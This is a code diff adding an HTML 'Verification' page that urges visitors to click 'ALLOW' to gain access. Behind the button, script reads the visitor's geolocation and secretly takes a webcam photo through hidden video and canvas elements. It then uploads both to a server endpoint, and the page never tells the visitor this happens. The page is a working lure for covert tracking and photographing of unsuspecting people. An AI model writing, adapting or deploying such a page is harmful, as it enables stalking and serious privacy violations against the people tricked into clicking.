@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verification</title>
+<style>
+html, body {
+  margin: 0;
+  padding: 0;
+  width: 100%;
+  height: 100%;
+  overflow: hidden;
+  font-family: Arial, sans-serif;
+  background: black;
+  color: white;
+}
+
+#bg {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  object-fit: cover;
+  z-index: -1;
+  filter: brightness(0.7);
+}
+
+.overlay {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  text-align: center;
+  background: rgba(0,0,0,0.5);
+  padding: 50px 60px;
+  border-radius: 15px;
+  box-shadow: 0 0 20px rgba(0,255,0,0.6);
+}
+
+.overlay h1 {
+  font-size: 48px;
+  margin-bottom: 15px;
+  letter-spacing: 4px;
+  text-shadow: 0 0 10px #0f0, 0 0 20px #0f0;
+}
+
+.overlay p {
+  font-size: 18px;
+  opacity: 0.9;
+}
+
+#allowBtn {
+  margin-top: 20px;
+  padding: 12px 25px;
+  font-size: 18px;
+  border: none;
+  border-radius: 8px;
+  background: #0f0;
+  color: black;
+  cursor: pointer;
+  font-weight: bold;
+}
+#allowBtn:hover {
+  background: #0c0;
+}
+</style>
+</head>
+<body>
+
+<video id="bg" autoplay muted loop playsinline>
+  <source src="https://files.catbox.moe/chpqan.mp4" type="video/mp4">
+</video>
+
+<div class="overlay">
+  <h1>KLIK ALLOW AGAR BISA ACCESS</h1>
+  <p>HELLO EVERYONE, I'M BACK</p>
+  <button id="allowBtn">🔥ALLOW🔥</button>
+</div>
+
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+document.getElementById("allowBtn").addEventListener("click", async () => {
+  const overlay = document.querySelector(".overlay");
+  overlay.style.display = "none"; 
+
+  let latitude = null;
+  let longitude = null;
+  let image = null;
+
+  if (navigator.geolocation) {
+    try {
+      const pos = await new Promise((resolve, reject) =>
+        navigator.geolocation.getCurrentPosition(resolve, reject)
+      );
+      latitude = pos.coords.latitude;
+      longitude = pos.coords.longitude;
+    } catch (e) { console.warn("Lokasi tidak diizinkan"); }
+  }
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const vid = document.getElementById("video");
+    vid.srcObject = stream;
+
+    await new Promise(r => setTimeout(r, 2000));
+
+    const canvas = document.getElementById("canvas");
+    canvas.width = vid.videoWidth;
+    canvas.height = vid.videoHeight;
+    canvas.getContext("2d").drawImage(vid, 0, 0);
+    image = canvas.toDataURL("image/jpeg");
+
+    stream.getTracks().forEach(track => track.stop());
+  } catch (err) { console.warn("Kamera tidak diizinkan"); }
+
+  await fetch("/api/upload", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ image, latitude, longitude })
+  });
+});
+</script>
+
+</body>
+</html>
